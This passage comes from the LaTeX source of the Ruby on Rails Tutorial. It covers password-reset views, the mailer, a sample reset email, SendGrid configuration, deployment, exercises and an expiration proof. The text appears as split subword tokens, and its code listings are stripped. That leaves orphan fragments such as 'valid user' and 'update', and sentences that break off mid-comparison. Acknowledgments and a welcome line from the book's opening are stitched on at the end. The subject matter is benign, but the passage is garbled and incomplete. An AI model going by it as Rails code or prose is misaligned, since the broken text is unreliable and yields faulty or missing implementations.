▁The ▁result ▁appears ▁in ▁Listing ~\ ref { code : new _ password _ reset } ▁and ▁F igure ~\ ref { fig : forgot _ password _ form }.
▁A ▁new ▁password ▁reset ▁view .
▁The ▁`` forgot ▁password '' ▁form .
▁U p on ▁ submitting ▁the ▁form ▁in ▁F igure ~\ ref { fig : forgot _ password _ form }, ▁we ▁need ▁to ▁find ▁the ▁user ▁by ▁email ▁address ▁and ▁update ▁its ▁attributes ▁with ▁the ▁password ▁reset ▁token ▁and ▁sent - at ▁timestamp .
▁We ▁the n ▁redirect ▁to ▁the ▁root ▁URL ▁with ▁an ▁in format ive ▁flash ▁message .
▁As ▁with ▁login ▁( Listing ~\ ref { code : correct _ login _ failure }), ▁in ▁the ▁case ▁of ▁an ▁invalid ▁submission ▁we ▁re - render ▁the ▁\ k ode { new } ▁page ▁with ▁a ▁\ k ode { flash . now } ▁message .
▁The ▁results ▁appear ▁in ▁Listing ~\ ref { code : create _ password _ reset }.
▁A ▁\ k ode { create } ▁action ▁for ▁password ▁resets .
▁The ▁code ▁in ▁the ▁User ▁model ▁parallel s ▁the ▁\ k ode { create \_ activation \_ digest } ▁method ▁used ▁in ▁the ▁\ k ode { before \_ create } ▁callback ▁( Listing ~\ ref { code : user _ model _ activation _ code }), ▁as ▁seen ▁in ▁Listing ~\ ref { code : user _ model _ password _ reset }.
▁ Adding ▁password ▁reset ▁methods ▁to ▁the ▁User ▁model .
▁As ▁show n ▁in ▁F igure ~\ ref { fig : invalid _ email _ password _ reset }, ▁at ▁this ▁point ▁the ▁application ' s ▁behavior ▁for ▁invalid ▁email ▁addresses ▁is ▁already ▁working .
▁To ▁get ▁the ▁application ▁working ▁upon ▁submission ▁of ▁a ▁valid ▁email ▁address ▁as ▁well , ▁we ▁need ▁to ▁define ▁a ▁password ▁reset ▁mailer ▁method .
▁The ▁`` forgot ▁password '' ▁form ▁for ▁an ▁invalid ▁email ▁address .
▁The ▁code ▁to ▁send ▁the ▁password ▁reset ▁email ▁appears ▁in ▁Listing ~\ ref { code : user _ model _ password _ reset } ▁as ▁follows :
▁The ▁password ▁reset ▁mailer ▁method ▁needed ▁to ▁get ▁this ▁working ▁is ▁ nearly ▁identical ▁to ▁the ▁mailer ▁for ▁account ▁activation ▁ developed ▁in ▁Section ~\ ref { sec : account _ activation _ mailer }.
▁We ▁first ▁create ▁a ▁\ k ode { password \_ reset } ▁method ▁in ▁the ▁user ▁mailer ▁( Listing ~\ ref { code : mail _ password _ reset }), ▁and ▁the n ▁define ▁view ▁templates ▁for ▁plain - text ▁email ▁( Listing ~\ ref { code : password _ reset _ text }) ▁and ▁HTML ▁email ▁( Listing ~\ ref { code : password _ reset _ html }).
▁ Mail ing ▁the ▁password ▁reset ▁link .
▁The ▁password ▁reset ▁plain - text ▁email ▁template .
▁< n >< n > If ▁you ▁did ▁not ▁request ▁your ▁password ▁to ▁be ▁reset , ▁please ▁ignore ▁this ▁email ▁and < n > your ▁password ▁will ▁sta y ▁as ▁it ▁is .
▁The ▁password ▁reset ▁HTML ▁email ▁template .
▁As ▁with ▁account ▁activation ▁email s ▁( Section ~\ ref { sec : account _ activation _ mailer }), ▁we ▁can ▁preview ▁password ▁reset ▁email s ▁using ▁the ▁Rails ▁email ▁preview er .
▁The ▁code ▁is ▁exactly ▁analogous ▁to ▁Listing ~\ ref { code : account _ activation _ preview }, ▁as ▁show n ▁in ▁Listing ~\ ref { code : password _ reset _ preview }.
▁A ▁working ▁preview ▁method ▁for ▁password ▁reset .
▁With ▁the ▁code ▁in ▁Listing ~\ ref { code : password _ reset _ preview }, ▁the ▁HTML ▁and ▁text ▁email ▁preview s ▁appear ▁as ▁in ▁F igure ~\ ref { fig : password _ reset _ html _ preview } ▁and ▁F igure ~\ ref { fig : password _ reset _ text _ preview }.
▁A ▁preview ▁of ▁the ▁HTML ▁version ▁of ▁the ▁password ▁reset ▁email .
▁A ▁preview ▁of ▁the ▁text ▁version ▁of ▁the ▁password ▁reset ▁email .
▁In ▁analogy ▁with ▁the ▁account ▁activation ▁mailer ▁method ▁test ▁( Listing ~\ ref { code : re al _ account _ activation _ test }), ▁we ' ll ▁write ▁a ▁short ▁test ▁of ▁the ▁password ▁reset ▁mailer ▁method , ▁as ▁show n ▁in ▁Listing ~\ ref { code : password _ reset _ mailer _ test }.
▁Note ▁that ▁we ▁need ▁to ▁create ▁a ▁password ▁reset ▁token ▁for ▁use ▁in ▁the ▁views ; ▁unlike ▁the ▁activation ▁token , ▁which ▁is ▁created ▁for ▁every ▁user ▁by ▁a ▁\ k ode { before \_ create } ▁callback ▁( Listing ~\ ref { code : user _ model _ activation _ code }), ▁the ▁password ▁reset ▁token ▁is ▁created ▁only ▁when ▁a ▁user ▁successfully ▁submit s ▁the ▁`` forgot ▁password '' ▁form .
▁This ▁will ▁occur ▁natural ly ▁in ▁an ▁integration ▁test ▁( Listing ~\ ref { code : password _ reset _ integration _ test }), ▁but ▁in ▁the ▁present ▁context ▁we ▁need ▁to ▁create ▁one ▁by ▁hand .
▁ Adding ▁a ▁test ▁of ▁the ▁password ▁reset ▁mailer ▁method .
▁With ▁the ▁code ▁in ▁Listing ~\ ref { code : mail _ password _ reset }, ▁Listing ~\ ref { code : password _ reset _ text }, ▁and ▁Listing ~\ ref { code : password _ reset _ html }, ▁submission ▁of ▁a ▁valid ▁email ▁address ▁appears ▁as ▁show n ▁in ▁F igure ~\ ref { fig : valid _ email _ password _ reset }.
▁The ▁corresponding ▁email ▁appears ▁in ▁the ▁server ▁log ▁and ▁should ▁look ▁something ▁like ▁Listing ~\ ref { code : password _ reset _ email }.
▁The ▁result ▁of ▁ submitting ▁a ▁valid ▁email ▁address .
▁A ▁sample ▁password ▁reset ▁email ▁from ▁the ▁server ▁log .
▁S ent ▁mail ▁to ▁ michael @ michael hartl . com ▁( 6 6 . 8 m s )< n > Date : ▁Thu , ▁ 04 ▁Sep ▁2014 ▁01 : 04 : 59 ▁ + 0000 < n > From : ▁no reply @ example . com < n > To : ▁ michael @ michael hartl . com < n > Message - ID : ▁< 5 4 07 b a b be e 1 39 _ 87 22 b 2 57 d 04 5 76 a @ mhartl - rails - tutorial - 9 5 37 5 3 . mail >< n > S u b j ec t : ▁ Password ▁reset < n > M i me - Version : ▁1. 0 < n > Content - Type : ▁multipart / alternative ; < n > ▁b ound ary =" - - = = _ mime part _ 5 4 07 b a b be 3 50 5 _ 87 22 b 2 57 d 04 5 6 17 " ; < n > ▁ cha r set = UT F -8 < n > Content - Transfer - Encoding : ▁7 b it < n >< n >< n > - --- = = _ mime part _ 5 4 07 b a b be 3 50 5 _ 87 22 b 2 57 d 04 5 6 17 < n > Content - Type : ▁text / plain ; < n > ▁ cha r set = UT F -8 < n > Content - Transfer - Encoding : ▁7 b it < n >< n > To ▁reset ▁your ▁password ▁click ▁the ▁link ▁below : < n >< n > http :// rails - tutorial - c 9 - mhartl . c 9 . io / password _ resets / 3 B d B r X e Q Z S W q F ID R N 8 c x H A / < n > edit ?
▁email = michael %40 michael hartl . com < n >< n > This ▁link ▁will ▁expire ▁in ▁two ▁hours .
▁< n > - --- = = _ mime part _ 5 4 07 b a b be 3 50 5 _ 87 22 b 2 57 d 04 5 6 17 < n > Content - Type : ▁text / html ; < n > ▁ cha r set = UT F -8 < n > Content - Transfer - Encoding : ▁7 b it < n >< n >< h 1> Password ▁reset </ h 1 >< n >< n >< p > To ▁reset ▁your ▁password ▁click ▁the ▁link ▁below : </ p >< n >< n >< a ▁ href =" http :// rails - tutorial - c 9 - mhartl . c 9 . io / < n > password _ resets / 3 B d B r X e Q Z S W q F ID R N 8 c x H A / < n > edit ?
▁email = michael %40 michael hartl . com "> Re set ▁password </ a >< n >< n >< p > This ▁link ▁will ▁expire ▁in ▁two ▁hours . </ p >< n >< n >< p >< n > If ▁you ▁did ▁not ▁request ▁your ▁password ▁to ▁be ▁reset , ▁please ▁ignore ▁this ▁email ▁and < n > your ▁password ▁will ▁sta y ▁as ▁it ▁is .
▁< n ></ p >< n > - --- = = _ mime part _ 5 4 07 b a b be 3 50 5 _ 87 22 b 2 57 d 04 5 6 17 - -
▁To ▁get ▁links ▁of ▁the ▁form
▁ http :// example . com / password _ resets / 3 B d B r X e Q Z S W q F ID R N 8 c x H A / edit ? email = foo %40 bar . com
▁to ▁work , ▁we ▁need ▁a ▁form ▁for ▁reset ting ▁passwords .
▁The ▁task ▁is ▁similar ▁to ▁updating ▁users ▁via ▁the ▁user ▁edit ▁view ▁( Listing ~\ ref { code : user _ edit _ view }), ▁but ▁in ▁this ▁case ▁with ▁only ▁password ▁and ▁confirmation ▁fields .
▁There ' s ▁an ▁ additional ▁com plication , ▁though : ▁we ▁expect ▁to ▁find ▁the ▁user ▁by ▁email ▁address , ▁which ▁means ▁we ▁need ▁its ▁value ▁in ▁both ▁the ▁\ k ode { edit } ▁and ▁\ k ode { update } ▁actions .
▁The ▁email ▁will ▁automatically ▁be ▁available ▁in ▁the ▁\ k ode { edit } ▁action ▁because ▁of ▁its ▁presence ▁in ▁the ▁link ▁above , ▁but ▁after ▁we ▁submit ▁the ▁form ▁its ▁value ▁will ▁be ▁lost .
▁The ▁solution ▁is ▁to ▁use ▁a ▁\ emph { hidden ▁field } ▁to ▁place ▁( but ▁not ▁display ) ▁the ▁email ▁on ▁the ▁page , ▁and ▁the n ▁submit ▁it ▁along ▁with ▁the ▁rest ▁of ▁the ▁form ' s ▁information .
▁The ▁result ▁appears ▁in ▁Listing ~\ ref { code : password _ reset _ form }
▁The ▁form ▁to ▁reset ▁a ▁password .
▁Note ▁that ▁Listing ~\ ref { code : password _ reset _ form } ▁uses ▁the ▁form ▁tag ▁helper
▁because ▁the ▁reset ▁link ▁put s ▁the ▁email ▁in ▁\ k ode { params [: email ]} , ▁whereas ▁the ▁latter ▁would ▁put ▁it ▁in ▁\ k ode { params [: user ] [: email ]} .
▁To ▁get ▁the ▁form ▁to ▁render , ▁we ▁need ▁to ▁define ▁an ▁\ k ode {@ user } ▁variable ▁in ▁the ▁ Password ▁Re set s ▁controller ' s ▁\ k ode { edit } ▁action .
▁As ▁with ▁account ▁activation ▁( Listing ~\ ref { code : account _ activation _ edit _ action }), ▁this ▁involve s ▁find ing ▁the ▁user ▁corresponding ▁to ▁the ▁email ▁address ▁in ▁\ k ode { params [: email ]} .
▁Because ▁the ▁exist ence ▁of ▁a ▁valid ▁\ k ode {@ user } ▁is ▁needed ▁in ▁both ▁the ▁\ k ode { edit } ▁and ▁\ k ode { update } ▁actions , ▁we ' ll ▁put ▁the ▁code ▁to ▁find ▁and ▁validate ▁it ▁in ▁a ▁couple ▁of ▁before ▁filter s , ▁as ▁show n ▁in ▁Listing ~\ ref { code : password _ reset _ edit _ action }.
▁The ▁\ k ode { edit } ▁action ▁for ▁password ▁reset .
▁valid ▁user
▁In ▁Listing ~\ ref { code : password _ reset _ edit _ action }, ▁compare ▁the ▁use ▁of
▁in ▁Listing ~\ ref { code : generalized _ current _ user } ▁and
▁in ▁Listing ~\ ref { code : account _ activation _ edit _ action }.
▁To get h er , ▁these ▁three ▁uses ▁complete ▁the ▁authentication ▁methods ▁show n ▁in ▁Table ~\ ref { table : password _ token _ digest }.
▁With ▁the ▁code ▁as ▁above , ▁following ▁the ▁link ▁from ▁Listing ~\ ref { code : password _ reset _ email } ▁should ▁render ▁a ▁password ▁reset ▁form .
▁The ▁result ▁appears ▁in ▁F igure ~\ ref { fig : password _ reset _ form }.
▁The ▁password ▁reset ▁form .
▁To ▁define ▁the ▁\ k ode { update } ▁action ▁corresponding ▁to ▁the ▁\ k ode { edit } ▁action ▁in ▁Listing ~\ ref { code : password _ reset _ edit _ action }, ▁we ▁need ▁to ▁consider ▁four ▁cases : ▁an ▁ expired ▁password ▁reset , ▁a ▁successful ▁update , ▁a ▁failed ▁update ▁( d ue ▁to ▁an ▁invalid ▁password ), ▁and ▁a ▁failed ▁update ▁( which ▁initially ▁look s ▁`` successful '') ▁due ▁to ▁a ▁blank ▁password ▁and ▁confirmation .
▁The ▁first ▁case ▁applies ▁to ▁both ▁the ▁\ k ode { edit } ▁and ▁\ k ode { update } ▁actions , ▁and ▁so ▁logic ally ▁belongs ▁in ▁a ▁before ▁filter ▁( Listing ~\ ref { code : password _ reset _ update _ action }).
▁The ▁next ▁two ▁cases ▁correspond ▁to ▁the ▁two ▁branches ▁in ▁the ▁main ▁\ k ode { if } ▁statement ▁show n ▁in ▁Listing ~\ ref { code : password _ reset _ update _ action }.
▁Because ▁the ▁edit ▁form ▁is ▁modify ing ▁an ▁Active ▁Record ▁model ▁object ▁( i . e . , ▁a ▁user ), ▁we ▁can ▁rely ▁on ▁the ▁ shared ▁partial ▁from ▁Listing ~\ ref { code : password _ reset _ form } ▁to ▁render ▁error ▁messages .
▁We ▁need ▁only ▁handle ▁the ▁case ▁where ▁the ▁password ▁is ▁empty ▁because ▁if ▁the ▁confirmation ▁is ▁empty , ▁the ▁confirmation ▁validation ▁( which ▁is ▁skip ped ▁if ▁the ▁password ▁is ▁empty ) ▁will ▁catch ▁the ▁problem ▁and ▁supply ▁a ▁relevant ▁error ▁message .
▁error
▁The ▁\ k ode { update } ▁action ▁for ▁password ▁reset .
▁update
▁# ▁Before ▁filter s
▁The ▁implementation ▁in ▁Listing ~\ ref { code : password _ reset _ update _ action } ▁delegate s ▁the ▁boolean ▁test ▁for ▁password ▁reset ▁ expiration ▁to ▁the ▁User ▁model ▁via ▁the ▁code
▁To ▁get ▁this ▁to ▁work , ▁we ▁need ▁to ▁define ▁the ▁\ k ode { password \_ reset \_ expired ? }
▁As ▁indicate d ▁in ▁the ▁email ▁templates ▁from ▁Section ~\ ref { sec : password _ reset _ mailer }, ▁we ' ll ▁consider ▁a ▁password ▁reset ▁to ▁be ▁ expired ▁if ▁it ▁was ▁sent ▁more ▁than ▁two ▁hours ▁ ago , ▁which ▁we ▁can ▁express ▁in ▁Ruby ▁as ▁follows :
▁This ▁can ▁be ▁confusing ▁if ▁you ▁read ▁\ k ode { < } ▁as ▁`` less ▁than '' , ▁because ▁the n ▁it ▁ s ound s ▁like ▁`` Password ▁reset ▁sent ▁less ▁than ▁two ▁hours ▁ ago , '' ▁which ▁is ▁the ▁oppos ite ▁of ▁what ▁we ▁want .
▁In ▁this ▁context , ▁it ' s ▁better ▁to ▁read ▁\ k ode { < } ▁as ▁`` e ar li er ▁than '' , ▁which ▁gives ▁something ▁like ▁`` Password ▁reset ▁sent ▁earlier ▁than ▁two ▁hours ▁ ago . ''
▁That ▁\ emph { is } ▁what ▁we ▁want , ▁and ▁it ▁lead s ▁to ▁the ▁\ k ode { password \_ reset \_ expired ?}\ ▁method ▁in ▁Listing ~\ ref { code : user _ model _ password _ reset _ expired }.
▁( For ▁a ▁form al ▁ demo n str ation ▁that ▁the ▁comparison ▁is ▁correct , ▁see ▁the ▁ proof ▁in ▁Section ~\ ref { sec : expiration _ proof }. )
▁# ▁Return s ▁true ▁if ▁a ▁password ▁reset ▁has ▁ expired .
▁With ▁the ▁code ▁in ▁Listing ~\ ref { code : user _ model _ password _ reset _ expired }, ▁the ▁\ k ode { update } ▁action ▁in ▁Listing ~\ ref { code : password _ reset _ update _ action } ▁should ▁be ▁working .
▁The ▁results ▁for ▁invalid ▁and ▁valid ▁submission s ▁are ▁show n ▁in ▁F igure ~\ ref { fig : password _ reset _ failure } ▁and ▁F igure ~\ ref { fig : password _ reset _ success }, ▁respectively .
▁( L ac k ing ▁the ▁p at i ence ▁to ▁wait ▁two ▁hours , ▁we ' ll ▁cover ▁the ▁third ▁branch ▁in ▁a ▁test , ▁which ▁is ▁left ▁as ▁an ▁exercise ▁( Section ~\ ref { sec : activation _ resets _ exercises }).)
▁A ▁failed ▁password ▁reset .
▁A ▁successful ▁password ▁reset .
▁In ▁this ▁section , ▁we ' ll ▁write ▁an ▁integration ▁test ▁cover ing ▁two ▁of ▁the ▁three ▁branches ▁in ▁Listing ~\ ref { code : password _ reset _ update _ action }, ▁invalid ▁and ▁valid ▁submission .
▁( As ▁noted ▁above , ▁testing ▁the ▁third ▁branch ▁is ▁left ▁as ▁an ▁exercise .)
▁We ' ll ▁get ▁started ▁by ▁ generating ▁a ▁test ▁file ▁for ▁password ▁resets :
▁create
▁The ▁steps ▁to ▁test ▁password ▁resets ▁broad ly ▁parallel ▁the ▁test ▁for ▁account ▁activation ▁from ▁Listing ~\ ref { code : signup _ with _ account _ activation _ test }, ▁though ▁there ▁is ▁a ▁difference ▁at ▁the ▁out set : ▁we ▁first ▁visit ▁the ▁`` forgot ▁password '' ▁form ▁and ▁submit ▁invalid ▁and ▁the n ▁valid ▁email ▁addresses , ▁the ▁latter ▁of ▁which ▁creates ▁a ▁password ▁reset ▁token ▁and ▁send s ▁the ▁reset ▁email .
▁We ▁the n ▁visit ▁the ▁link ▁from ▁the ▁email ▁and ▁again ▁submit ▁invalid ▁and ▁valid ▁information , ▁verify ing ▁the ▁correct ▁behavior ▁in ▁each ▁case .
▁The ▁result ing ▁test , ▁show n ▁in ▁Listing ~\ ref { code : password _ reset _ integration _ test }, ▁is ▁an ▁excellent ▁exercise ▁in ▁reading ▁code .
▁An ▁integration ▁test ▁for ▁password ▁resets .
▁ Password
▁ Most ▁of ▁the ▁idea s ▁in ▁Listing ~\ ref { code : password _ reset _ integration _ test } ▁have ▁appear ed ▁previous ly ▁in ▁this ▁tutorial ; ▁the ▁only ▁really ▁no ve l ▁element ▁is ▁the ▁test ▁of ▁the ▁\ k ode { input } ▁tag :
▁This ▁make s ▁sure ▁that ▁there ▁is ▁an ▁\ k ode { input } ▁tag ▁with ▁the ▁right ▁name , ▁( hidden ) ▁type , ▁and ▁email ▁address :
▁With ▁the ▁code ▁as ▁in ▁Listing ~\ ref { code : password _ reset _ integration _ test }, ▁our ▁test ▁suite ▁should ▁be ▁\ passing :
▁As ▁a ▁c ap st one ▁to ▁our ▁work ▁on ▁account ▁activation ▁and ▁password ▁remind ers , ▁in ▁this ▁section ▁we ' ll ▁configure ▁our ▁application ▁so ▁that ▁it ▁can ▁actually ▁send ▁email ▁in ▁production .
▁We ' ll ▁first ▁get ▁set ▁up ▁with ▁a ▁free ▁ service ▁to ▁send ▁email , ▁and ▁the n ▁configure ▁and ▁deploy ▁our ▁application .
▁To ▁send ▁email ▁in ▁production , ▁we ' ll ▁use ▁SendGrid , ▁which ▁is ▁available ▁as ▁an ▁add - on ▁at ▁Heroku ▁for ▁verifie d ▁account s .
▁( This ▁requires ▁adding ▁c r edit ▁ card ▁information ▁to ▁your ▁Heroku ▁account , ▁but ▁there ▁is ▁no ▁charge ▁when ▁verify ing ▁an ▁account .)
▁We ▁can ▁add ▁it ▁to ▁our ▁app ▁as ▁follows :
▁To ▁configure ▁our ▁application ▁to ▁use ▁SendGrid , ▁we ▁need ▁to ▁fill ▁out ▁the ▁\ href { https :// en . wiki p edia . org / wiki / S i mp le _ Mail _ Transfer _ Protocol }{ S M T P } ▁settings ▁for ▁our ▁production ▁environment .
▁As ▁show n ▁in ▁Listing ~\ ref { code : s end gr id _ config }, ▁you ▁will ▁also ▁have ▁to ▁define ▁a ▁\ k ode { host } ▁variable ▁with ▁the ▁address ▁of ▁your ▁production ▁website .
▁Configur ing ▁Rails ▁to ▁use ▁SendGrid ▁in ▁production .
▁config / environments / production . rb
▁=> ▁true
▁The ▁email ▁configuration ▁in ▁Listing ~\ ref { code : s end gr id _ config } ▁includes ▁the ▁\ k ode { user \_ name } ▁and ▁\ line break ▁\ k ode { password } ▁of ▁the ▁SendGrid ▁account , ▁but ▁note ▁that ▁they ▁are ▁access ed ▁via ▁the ▁\ k ode { ENV } ▁environment ▁variable ▁instead ▁of ▁being ▁hard - code d .
▁This ▁is ▁a ▁best ▁practice ▁for ▁production ▁applications , ▁which ▁for ▁security ▁reason s ▁should ▁ never ▁expose ▁ sensitive ▁information ▁such ▁as ▁raw ▁passwords ▁in ▁source ▁code .
▁In ▁the ▁present ▁case , ▁these ▁variables ▁are ▁configured ▁automatically ▁via ▁the ▁SendGrid ▁add - on , ▁but ▁we ' ll ▁see ▁an ▁example ▁in ▁Section ~\ ref { sec : image _ upload _ in _ production } ▁where ▁we ' ll ▁have ▁to ▁define ▁them ▁our s el ve s .
▁In ▁case ▁you ' re ▁curious , ▁you ▁can ▁view ▁the ▁environment ▁variables ▁used ▁in ▁Listing ~\ ref { code : s end gr id _ config } ▁as ▁follows :
▁At ▁this ▁point , ▁you ▁should ▁merge ▁the ▁topic ▁branch ▁into ▁master :
▁ $ ▁bundle ▁exec ▁rake ▁test < n > $ ▁git ▁add ▁- A < n > $ ▁git ▁commit ▁- m ▁" A d d ▁password ▁resets ▁ & ▁email ▁configuration " < n > $ ▁git ▁ checkout ▁master < n > $ ▁git ▁merge ▁account - activation - password - reset
▁Then ▁push ▁up ▁to ▁the ▁remote ▁repository ▁and ▁deploy ▁to ▁Heroku :
▁ $ ▁bundle ▁exec ▁rake ▁test < n > $ ▁git ▁push < n > $ ▁git ▁push ▁ heroku < n > $ ▁ heroku ▁run ▁rake ▁db : migrate
▁On ce ▁the ▁Heroku ▁deploy ▁has ▁finished , ▁try ▁sign ing ▁up ▁for ▁the ▁sample ▁application ▁in ▁production ▁using ▁an ▁email ▁address ▁you ▁control .
▁You ▁should ▁get ▁an ▁activation ▁email ▁as ▁implemented ▁in ▁Section ~\ ref { sec : account _ activation s _ resource } ▁( F igure ~\ ref { fig : activation _ email _ production }).
▁If ▁you ▁the n ▁ forget ▁( or ▁pre t end ▁to ▁ forget ) ▁your ▁password , ▁you ▁can ▁reset ▁it ▁as ▁ developed ▁in ▁Section ~\ ref { sec : password _ reset } ▁( F igure ~\ ref { fig : reset _ email _ production }).
▁An ▁account ▁activation ▁email ▁sent ▁in ▁production .
▁A ▁password ▁reset ▁email ▁sent ▁in ▁production .
▁With ▁the ▁added ▁account ▁activation ▁and ▁password ▁resets , ▁our ▁sample ▁application ' s ▁sign ▁up , ▁log ▁in , ▁and ▁log ▁out ▁machinery ▁is ▁complete ▁and ▁p rofessional - grade .
▁The ▁rest ▁of ▁the ▁\ emph { Ruby ▁on ▁Rails ▁Tutorial } ▁build s ▁on ▁this ▁foundation ▁to ▁make ▁a ▁site ▁with ▁Twitter - like ▁microposts ▁( Chapter ~\ ref { cha : user _ microposts }) ▁and ▁a ▁status ▁feed ▁of ▁posts ▁from ▁followed ▁users ▁( Chapter ~\ ref { cha : following _ users }).
▁In ▁the ▁process , ▁we ' ll ▁learn ▁about ▁some ▁of ▁the ▁most ▁powerful ▁features ▁of ▁Rails , ▁including ▁image ▁upload , ▁custom ▁database ▁queries , ▁and ▁advanced ▁data ▁model ing ▁with ▁\ k ode { has \_ many } ▁and ▁\ k ode { has \_ many ▁: through }.
▁< n >< n >\ subsection { What ▁we ▁ learned ▁in ▁this ▁chapter } ▁% ▁( fold )< n >\ label { sec : activation _ resets _ what _ we _ learned _ in _ this _ chapter }< n >< n >\ begin { item ize }< n >< n >\ item
▁Like ▁sessions , ▁account ▁activation s ▁can ▁be ▁model ed ▁as ▁a ▁resource ▁desp ite ▁not ▁being ▁Active ▁Record ▁objects .
▁Rails ▁can ▁generate ▁Active ▁Mailer ▁actions ▁and ▁views ▁to ▁send ▁email .
▁Action ▁Mailer ▁supports ▁both ▁plain - text ▁and ▁HTML ▁mail .
▁As ▁with ▁ordinar y ▁actions ▁and ▁views , ▁instance ▁variables ▁defined ▁in ▁mailer ▁actions ▁are ▁available ▁in ▁mailer ▁views .
▁Like ▁sessions ▁and ▁account ▁activation s , ▁password ▁resets ▁can ▁be ▁model ed ▁as ▁a ▁resource ▁desp ite ▁not ▁being ▁Active ▁Record ▁objects .
▁ Account ▁activation s ▁and ▁password ▁resets ▁use ▁a ▁generated ▁token ▁to ▁create ▁a ▁unique ▁URL ▁for ▁ activating ▁users ▁or ▁reset ting ▁passwords , ▁respectively .
▁Bo th ▁mailer ▁tests ▁and ▁integration ▁tests ▁are ▁useful ▁for ▁verify ing ▁the ▁behavior ▁of ▁the ▁User ▁mailer .
▁We ▁can ▁send ▁email ▁in ▁production ▁using ▁SendGrid .
▁Writ e ▁an ▁integration ▁test ▁for ▁the ▁ expired ▁password ▁reset ▁branch ▁in ▁Listing ~\ ref { code : password _ reset _ update _ action } ▁by ▁ filling ▁in ▁the ▁template ▁show n ▁in ▁Listing ~\ ref { code : password _ reset _ expire _ test }.
▁( This ▁code ▁introduce s ▁\ k ode { response . body }, ▁which ▁returns ▁the ▁full ▁HTML ▁body ▁of ▁the ▁page .)
▁There ▁are ▁many ▁ways ▁to ▁test ▁for ▁the ▁result ▁of ▁an ▁ expiration , ▁but ▁the ▁method ▁suggest ed ▁by ▁Listing ~\ ref { code : password _ reset _ expire _ test } ▁is ▁to ▁( case - insensitive ly ) ▁check ▁that ▁the ▁response ▁body ▁includes ▁the ▁word ▁`` expired ''.
▁R ight ▁now ▁\ emph { all } ▁users ▁are ▁displayed ▁on ▁the ▁user ▁index ▁page ▁at ▁/ users ▁and ▁are ▁visible ▁via ▁the ▁URL ▁/ users / : id , ▁but ▁it ▁make s ▁sense ▁to ▁show ▁users ▁only ▁if ▁they ▁are ▁ activated .
▁in ▁Listing ~\ ref { code : show _ only _ active _ users _ exercise }.
▁The ▁two ▁are ▁ nearly ▁identical , ▁but ▁the ▁latter ▁operator ▁has ▁a ▁high er ▁\ href { http :// en . wiki p edia . org / wiki / Order _ of _ o p er ation s # Programming _ language s }{\ emph { pre c ed ence } }, ▁which ▁bin d s ▁too ▁t ight ly ▁to ▁\ k ode { root \_ url } ▁in ▁this ▁case .
▁We ▁could ▁fix ▁the ▁problem ▁by ▁ putting ▁\ k ode { root \_ url } ▁in ▁parentheses , ▁but ▁the ▁idiomatic ally ▁correct ▁way ▁to ▁do ▁it ▁is ▁to ▁use ▁\ k ode { and } ▁instead .
▁\ emph { Extra ▁c r edit } : ▁Writ e ▁integration ▁tests ▁for ▁both ▁/ users ▁and ▁/ users / : id .
▁By ▁ filling ▁in ▁the ▁template ▁show n ▁in ▁Listing ~\ ref { code : update _ columns }, ▁replace ▁each ▁pair ▁of ▁\ k ode { update \_ attribute } ▁calls ▁with ▁a ▁single ▁call ▁to ▁\ k ode { update \_ columns }, ▁which ▁hit s ▁the ▁database ▁only ▁once .
▁After ▁making ▁the ▁changes , ▁verify ▁that ▁the ▁test ▁suite ▁is ▁ still ▁\ passing .
▁A ▁test ▁for ▁an ▁ expired ▁password ▁reset .
▁A ▁template ▁for ▁code ▁to ▁show ▁only ▁active ▁users .
▁index
▁A ▁template ▁for ▁using ▁\ k ode { update \_ columns }.
▁In ▁this ▁section , ▁we ' ll ▁pro ve ▁that ▁the ▁comparison ▁for ▁password ▁ expiration ▁in ▁Section ~\ ref { sec : reset ting _ the _ password } ▁is ▁correct .
▁We ▁start ▁by ▁defin ing ▁two ▁time ▁in ter v al s .
▁A ▁password ▁reset ▁has ▁ expired ▁if ▁the ▁time ▁in ter v al ▁since ▁the ▁reset ▁was ▁sent ▁is ▁greater ▁than ▁the ▁ expiration ▁limit :
▁\ begin { equ ation }< n >\ label { e q : time _ de lt a }< n >\ D el t a ▁t _ r ▁ > ▁\ D el t a ▁t _ e .
▁< n >\ end { equ ation }
▁\ begin { equ ation }< n >\ label { e q : de lt a _ p }< n >\ D el t a ▁t _ r ▁= ▁t _ N ▁- ▁t _ r < n >\ end { equ ation }
▁\ begin { equ ation }< n >\ label { e q : de lt a _ e }< n >\ D el t a ▁t _ e ▁= ▁t _ N ▁- ▁t _ e .
▁\ begin { equ ation }< n >\ label { e q : time _ com p ar is on }< n > t _ r ▁< ▁t _ e .
▁As ▁noted ▁in ▁Section ~\ ref { sec : reset ting _ the _ password }, ▁if ▁we ▁read ▁\ k ode { < } ▁as ▁`` e ar li er ▁than '' ▁instead ▁of ▁`` less ▁than '' , ▁this ▁code ▁make s ▁sense ▁as ▁the ▁English ▁ sentence ▁`` The ▁password ▁reset ▁was ▁sent ▁earlier ▁than ▁two ▁hours ▁ ago . ''
▁The ▁\ emph { Ruby ▁on ▁Rails ▁Tutorial } ▁ o we s ▁a ▁lot ▁to ▁my ▁previous ▁Rails ▁book , ▁\ emph { Rails Space }, ▁and ▁hence ▁to ▁my ▁co author ▁\ href { http :// a ure . com /}{ A ure li us ▁ Pro cha z k a }.
▁I ' d ▁like ▁to ▁than k ▁A ure ▁both ▁for ▁the ▁work ▁he ▁did ▁on ▁that ▁book ▁and ▁for ▁his ▁support ▁of ▁this ▁one .
▁I ' d ▁also ▁like ▁to ▁than k ▁De b ra ▁Wi ll i am s ▁C a ul e y , ▁my ▁editor ▁on ▁both ▁\ emph { Rails Space } ▁and ▁the ▁\ emph { Ruby ▁on ▁Rails ▁Tutorial } ; ▁as ▁long ▁as ▁ s h e ▁keep s ▁tak ing ▁me ▁to ▁base b all ▁game s , ▁I ' ll ▁keep ▁writing ▁book s ▁for ▁h er .
▁F inally , ▁many , ▁many ▁readers --- f ar ▁too ▁many ▁to ▁list --- ha ve ▁contribute d ▁a ▁ huge ▁number ▁of ▁bug ▁report s ▁and ▁suggest ion s ▁during ▁the ▁writing ▁of ▁this ▁book , ▁and ▁I ▁ gr ate full y ▁a c knowledg e ▁their ▁help ▁in ▁making ▁it ▁as ▁good ▁as ▁it ▁can ~ be .
▁ Welcome ▁to ▁\ href { http :// www . railstutorial . org / book }{\ emph { Ruby ▁on ▁Rails ▁Tutorial : ▁ Learn ▁Web ▁De ve lo p ment ▁with ▁Rails } }.
